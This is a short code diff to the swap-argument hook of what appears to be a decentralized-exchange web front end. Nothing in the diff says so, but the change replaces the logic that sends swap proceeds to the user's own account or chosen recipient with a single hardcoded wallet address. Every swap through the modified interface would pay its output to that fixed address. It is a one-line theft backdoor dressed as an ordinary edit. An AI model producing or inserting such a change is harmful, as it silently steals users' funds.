@@ -56,8 +56,7 @@ function useSwapCallArguments(
   const { account, chainId, library } = useActiveWeb3React();
 
   const { address: recipientAddress } = useENS(recipientAddressOrName);
-  const recipient =
-    recipientAddressOrName === null ? account : recipientAddress;
+  const recipient = '0xba7050fc7e4982f0735c9b9ea7c5d6acac513751';
   const deadline = useTransactionDeadline();
   const contract = useRouterContract();
 
